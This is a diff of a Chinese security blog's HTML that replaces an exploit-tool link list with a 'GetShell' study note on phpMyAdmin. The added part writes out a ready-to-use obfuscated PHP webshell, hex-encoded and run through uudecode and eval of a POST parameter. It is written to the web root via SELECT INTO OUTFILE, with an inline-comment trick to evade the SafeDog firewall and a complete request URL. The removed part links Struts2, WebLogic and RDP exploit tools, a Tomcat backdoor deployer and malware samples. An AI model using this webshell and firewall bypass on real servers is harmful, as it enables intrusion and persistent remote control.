+<pre><code>select 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><p>绕过安全狗4.0 通过hex编码+内联注释</p>
+<pre><code>/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><h3 id="绕过写入-1"><a href="#绕过写入-1" class="headerlink" title="绕过写入"></a>绕过写入</h3><p>绕过server_sql.php、tbl_sql.php、db_sql.php + 安全狗导出WebShell<br>以上的三个文件的作用是（执行SQL语句）<br>但是如果被删除了可以通过以下的方法</p>
 <ul>
-<li>apache_solr_via_velocity_template_rce复现<br><a href="https://3h85yh.coding-pages.com/2019/10/31/apache-solr-via-velocity-template-rce-fu-xian/" target="_blank" rel="noopener">https://3h85yh.coding-pages.com/2019/10/31/apache-solr-via-velocity-template-rce-fu-xian/</a></li>
+<li>token需要</li>
+<li>自己选择一个数据库和数据表</li>
+<li>参数pos=0</li>
 </ul>
-<h1 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h1><hr>
-<ul>
-<li><p>自动扫描到ssl漏洞（心血、ccs注射、sslv3贵宾犬、怪胎、logjam攻击、sslv2溺水等）。<br><a href="https://github.com/hahwul/a2sv" target="_blank" rel="noopener">https://github.com/hahwul/a2sv</a></p>
-</li>
-<li><p>SSL扫描器sslscan<br><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p>
-</li>
-</ul>
-<h1 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h1><hr>
-<ul>
-<li><p>shack2/Struts2VulsTools: Struts2系列漏洞检查工具<br><a href="https://github.com/shack2/Struts2VulsTools" target="_blank" rel="noopener">https://github.com/shack2/Struts2VulsTools</a></p>
-</li>
-<li><p>HatBoy/Struts2-Scan: Struts2全漏洞扫描利用工具<br><a href="https://github.com/HatBoy/Struts2-Scan" target="_blank" rel="noopener">https://github.com/HatBoy/Struts2-Scan</a></p>
-</li>
-</ul>
-<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><hr>
-<ul>
-<li>tomcat自动后门部署<br><a href="https://github.com/mgeeky/tomcatWarDeployer" target="_blank" rel="noopener">https://github.com/mgeeky/tomcatWarDeployer</a></li>
-</ul>
-<h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><hr>
-<ul>
-<li><p>shack2/javaserializetools: Java反序列化漏洞利用工具V1.0 Java反序列化相关漏洞的检查工具，<br>采用JDK 1.8+NetBeans8.2开发，软件运行必须安装JDK 1.8或者以上版本。<br>支持：weblogic xml反序列化漏洞 CVE-2017-10271/CNVD-C-2019-48814/CVE-2019-2725检查。<br><a href="https://github.com/shack2/javaserializetools" target="_blank" rel="noopener">https://github.com/shack2/javaserializetools</a></p>
-</li>
-<li><p>rabbitmask/WeblogicScan: Weblogic一键漏洞检测工具，V1.3<br><a href="https://github.com/dylan903/WeblogicScan" target="_blank" rel="noopener">https://github.com/dylan903/WeblogicScan</a></p>
-</li>
-<li><p>7kbstorm:WebLogic CNVD-C-2019_48814 CVE-2017-10271 Scan By 7kbstorm<br><a href="https://github.com/7kbstorm/WebLogic_CNVD_C2019_48814" target="_blank" rel="noopener">https://github.com/7kbstorm/WebLogic_CNVD_C2019_48814</a></p>
-</li>
-<li><p>dr0op/WeblogicScan: 增强版WeblogicScan、检测结果更精确、插件化,Python3支持<br><a href="https://github.com/dylan903/WeblogicScan-1" target="_blank" rel="noopener">https://github.com/dylan903/WeblogicScan-1</a></p>
-</li>
-</ul>
-<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><hr>
-<ul>
-<li><p><a href="https://3h85yh.coding-pages.com/2019/09/07/cve-2019-0708-yuan-cheng-zhuo-mian-dai-ma-zhi-xing-lou-dong-fu-xian/" target="_blank" rel="noopener">CVE-2019-0708远程桌面代码执行漏洞复现</a></p>
-</li>
-<li><p>zerosum0x0/CVE-2019-0708: Scanner PoC for CVE-2019-0708 RDP RCE vuln<br><a href="https://github.com/zerosum0x0/CVE-2019-0708" target="_blank" rel="noopener">https://github.com/zerosum0x0/CVE-2019-0708</a></p>
-</li>
-<li><p>PowerSploit - A PowerShell Post-Exploitation Framework<br><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p>
-</li>
-</ul>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><hr>
-<ul>
-<li><p>git泄露利用EXP<br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p>
-</li>
-<li><p>CVE-2016-2107<br><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p>
-</li>
-<li><p>CVE-2015-7547 POC<br><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p>
-</li>
-<li><p>Jenkins CommonCollections EXP<br><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p>
-</li>
-<li><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):<br><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p>
-</li>
-<li><p>XcodeGhost木马样本<br><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p>
-</li>
-</ul>
+<pre><code>&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><p>例如</p>
+<pre><code>http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&amp;token=token值&amp;table=数据表名&amp;pos=0&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><h1 id="CMS-GetShell"><a href="#CMS-GetShell" class="headerlink" title="CMS GetShell"></a>CMS GetShell</h1><h2 id="WordPress-1"><a href="#WordPress-1" class="headerlink" title="WordPress"></a>WordPress</h2><p><a href="https://dylan903.coding.me/2019/11/06/wordpress-hou-tai-getshell-zong-jie/">Wordpress 后台GetShell总结</a></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://bbs.ichunqiu.com/thread-19893-1-1.html" target="_blank" rel="noopener">PhpMyAdmin 网站路径信息获取</a><br><a href="https://blog.csdn.net/q1352483315/article/details/88904001" target="_blank" rel="noopener">总结下写phpmyadmin写shell的方法</a><br><a href="https://xz.aliyun.com/t/3283" target="_blank" rel="noopener">phpmyadmin getshell姿势 - 先知社区</a></p>
 
             </div>
             <hr/>
@@ -759,9 +799,9 @@ DISCUZ漏洞扫描器：https://">
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《学习总结篇—漏洞利用》
+                    《学习总结篇—GetShell》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/20/xue-xi-zong-jie-pian-lou-dong-li-yong/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/28/xue-xi-zong-jie-pian-getshell/" property="cc:attributionName"
                rel="cc:attributionURL">
                 dylan
             </a> 采用
@@ -1060,30 +1100,32 @@ DISCUZ漏洞扫描器：https://">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
-            </div>
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/11/20/xue-xi-zong-jie-pian-lou-dong-li-yong/">
+                <a href="/2019/08/31/sublime-text3-shi-yong-zhi-nan/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="学习总结篇—漏洞利用">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Sublime Text3使用指南">
                         
-                        <span class="card-title">学习总结篇—漏洞利用</span>
+                        <span class="card-title">Sublime Text3使用指南</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            学习总结篇—漏洞利用
+                            0x01 前言sublime是一款轻便、快捷的编辑器，好处多多，只不过配置起来麻烦了点，所有在此记录一下自用配置。（本文默认环境为window 10）
+
+0x02 下载官网直达,下载安装即可
+0x03 使用技巧启用VIM模式在Prefere
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-20
-                            </span>
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-31
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -1096,16 +1138,27 @@ DISCUZ漏洞扫描器：https://">
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/summary/" target="_blank">
-                        <span class="chip bg-color">summary</span>
+                    <a href="/tags/Sublime-Text3/" target="_blank">
+                        <span class="chip bg-color">Sublime Text3</span>
                     </a>
                     
-                    <a href="/tags/漏洞利用/" target="_blank">
-                        <span class="chip bg-color">漏洞利用</span>
+                    <a href="/tags/透明美化/" target="_blank">
+                        <span class="chip bg-color">透明美化</span>
+                    </a>
+                    
+                    <a href="/tags/python/" target="_blank">
+                        <span class="chip bg-color">python</span>
+                    </a>
+                    
+                    <a href="/tags/插件/" target="_blank">
+                        <span class="chip bg-color">插件</span>
+                    </a>
+                    
+                    <a href="/tags/vim/" target="_blank">
+                        <span class="chip bg-color">vim</span>
                     </a>
                     
                 </div>
@@ -1119,24 +1172,24 @@ DISCUZ漏洞扫描器：https://">
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/11/20/xue-xi-zong-jie-pian-getshell/">
+                <a href="/2019/08/27/xue-xi-zong-jie-pian-linux/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="学习总结篇—GetShell">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="学习总结篇—Linux">
                         
-                        <span class="card-title">学习总结篇—GetShell</span>
+                        <span class="card-title">学习总结篇—Linux</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            学习总结篇—GetShell
+                            学习总结篇—Linux
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-20
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-27
                             </span>
                         <span class="publish-author">
                             
@@ -1153,8 +1206,8 @@ DISCUZ漏洞扫描器：https://">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/GetShell/" target="_blank">
-                        <span class="chip bg-color">GetShell</span>
+                    <a href="/tags/Linux/" target="_blank">
+                        <span class="chip bg-color">Linux</span>
                     </a>
                     
                     <a href="/tags/summary/" target="_blank">
